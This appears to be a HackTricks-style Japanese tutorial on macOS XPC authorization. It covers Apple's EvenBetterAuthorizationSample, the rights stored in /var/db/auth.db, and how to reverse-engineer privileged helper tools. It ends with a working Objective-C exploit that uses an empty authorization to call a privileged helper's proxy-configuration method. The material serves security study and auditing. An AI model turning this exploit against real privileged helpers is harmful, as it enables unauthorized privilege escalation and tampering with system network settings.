# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Appleは、接続プロセスが**公開されたXPCメソッドを呼び出す権限を持っているかどうかを認証する**別の方法を提案しています。

アプリケーションが**特権ユーザーとしてアクションを実行する**必要がある場合、通常は特権ユーザーとしてアプリを実行するのではなく、アプリから呼び出してそのアクションを実行できるXPCサービスとしてHelperToolをルートとしてインストールします。ただし、サービスを呼び出すアプリは十分な認可を持っている必要があります。

### ShouldAcceptNewConnectionは常にYES

例として、[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)を見つけることができます。`App/AppDelegate.m`では、**HelperTool**に**接続**しようとします。そして、`HelperTool/HelperTool.m`では、関数**`shouldAcceptNewConnection`**は、前述の要件のいずれも**チェックしません**。常にYESを返します:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
詳細な設定方法については、次を確認してください：

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### アプリケーションの権限

ただし、**HelperToolからメソッドが呼び出されるときにいくつかの認可が行われます**。

`App/AppDelegate.m`の**`applicationDidFinishLaunching`**関数は、アプリが起動した後に空の認可参照を作成します。これは常に機能するはずです。\
次に、`setupAuthorizationRights`を呼び出して、その認可参照に**いくつかの権限を追加しようとします**：
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m`の`setupAuthorizationRights`関数は、アプリケーションの権限を`/var/db/auth.db`の認証データベースに保存します。データベースにまだ存在しない権限のみを追加することに注意してください。
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
`enumerateRightsUsingBlock` 関数は、`commandInfo` に定義されたアプリケーションの権限を取得するために使用されます。
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
このプロセスの最後に、`commandInfo`内で宣言された権限は`/var/db/auth.db`に保存されます。ここでは、**各メソッド**が**認証を必要とする**こと、**権限名**、および**`kCommandKeyAuthRightDefault`**が見つかります。後者は**誰がこの権利を取得できるか**を示します。

権利にアクセスできる人を示すための異なるスコープがあります。それらのいくつかは[AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)で定義されています（[ここで全てを見つけることができます](https://www.dssw.co.uk/reference/authorization-rights/)）、要約すると：

<table><thead><tr><th width="284.3333333333333">名前</th><th width="165">値</th><th>説明</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>誰でも</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>誰も</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>現在のユーザーは管理者である必要があります（管理者グループ内）</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>ユーザーに認証を求めます。</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>ユーザーに認証を求めます。彼は管理者である必要があります（管理者グループ内）</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>ルールを指定します</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>権利に関する追加のコメントを指定します</td></tr></tbody></table>

### 権利の検証

`HelperTool/HelperTool.m`の関数**`readLicenseKeyAuthorization`**は、呼び出し元が**そのメソッドを実行する**権限があるかどうかを確認するために、関数**`checkAuthorization`**を呼び出します。この関数は、呼び出しプロセスによって送信された**authData**が**正しい形式**であるかどうかを確認し、その後、特定のメソッドを呼び出すために**必要なもの**を確認します。すべてがうまくいけば、**返された`error`は`nil`になります**：
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
注意してください、**そのメソッドを呼び出す権利を確認するために**、関数 `authorizationRightForCommand` は以前のコメントオブジェクト **`commandInfo`** をチェックします。次に、**`AuthorizationCopyRights`** を呼び出して、関数を呼び出す**権利があるかどうか**を確認します（フラグはユーザーとの対話を許可することに注意してください）。

この場合、関数 `readLicenseKeyAuthorization` を呼び出すために、`kCommandKeyAuthRightDefault` は `@kAuthorizationRuleClassAllow` に定義されています。したがって、**誰でも呼び出すことができます**。

### DB 情報

この情報は `/var/db/auth.db` に保存されていると述べられました。保存されたすべてのルールをリストするには、次のコマンドを使用します:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
次に、誰がその権利にアクセスできるかを読むことができます:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 許可権限

**すべての権限設定**は[**こちら**](https://www.dssw.co.uk/reference/authorization-rights/)で確認できますが、ユーザーの操作を必要としない組み合わせは以下の通りです：

1. **'authenticate-user': 'false'**
- これは最も直接的なキーです。`false`に設定されている場合、ユーザーがこの権利を得るために認証を提供する必要がないことを指定します。
- これは、以下の2つのいずれかと組み合わせて使用されるか、ユーザーが属する必要があるグループを示します。
2. **'allow-root': 'true'**
- ユーザーがルートユーザー（昇格された権限を持つ）として操作している場合、このキーが`true`に設定されていると、ルートユーザーは追加の認証なしにこの権利を得る可能性があります。ただし、通常、ルートユーザーの状態に到達するにはすでに認証が必要であるため、これはほとんどのユーザーにとって「認証なし」のシナリオではありません。
3. **'session-owner': 'true'**
- `true`に設定されている場合、セッションの所有者（現在ログインしているユーザー）は自動的にこの権利を得ます。ユーザーがすでにログインしている場合、追加の認証をバイパスする可能性があります。
4. **'shared': 'true'**
- このキーは認証なしに権利を付与しません。代わりに、`true`に設定されている場合、権利が認証された後は、各プロセスが再認証を必要とせずに複数のプロセス間で共有できることを意味します。しかし、権利の最初の付与は、`'authenticate-user': 'false'`のような他のキーと組み合わせない限り、認証を必要とします。

興味深い権利を取得するために[**このスクリプト**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)を使用できます：
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## 認可の逆コンパイル

### EvenBetterAuthorizationが使用されているかの確認

関数 **`[HelperTool checkAuthorization:command:]`** を見つけた場合、おそらくそのプロセスは前述のスキーマを使用して認可を行っています：

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

この場合、この関数が `AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree` などの関数を呼び出している場合、[**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) を使用しています。

**`/var/db/auth.db`** を確認して、ユーザーの操作なしで特権アクションを呼び出すための権限を取得できるかどうかを確認してください。

### プロトコル通信

次に、XPCサービスとの通信を確立するためにプロトコルスキーマを見つける必要があります。

関数 **`shouldAcceptNewConnection`** は、エクスポートされているプロトコルを示しています：

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

この場合、EvenBetterAuthorizationSampleと同じものであり、[**この行を確認してください**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。

使用されているプロトコルの名前が分かれば、**そのヘッダー定義をダンプする**ことが可能です：
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最後に、通信を確立するために**公開されたMachサービスの名前**を知る必要があります。これを見つける方法はいくつかあります：

- **`[HelperTool init]`**で使用されているMachサービスを見ることができます：

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plistの中で：
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### エクスプロイトの例

この例では、以下が作成されます：

- 関数を持つプロトコルの定義
- アクセスを要求するために使用する空の認証
- XPCサービスへの接続
- 接続が成功した場合の関数への呼び出し
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 他のXPC特権ヘルパーの悪用

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## 参考文献

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
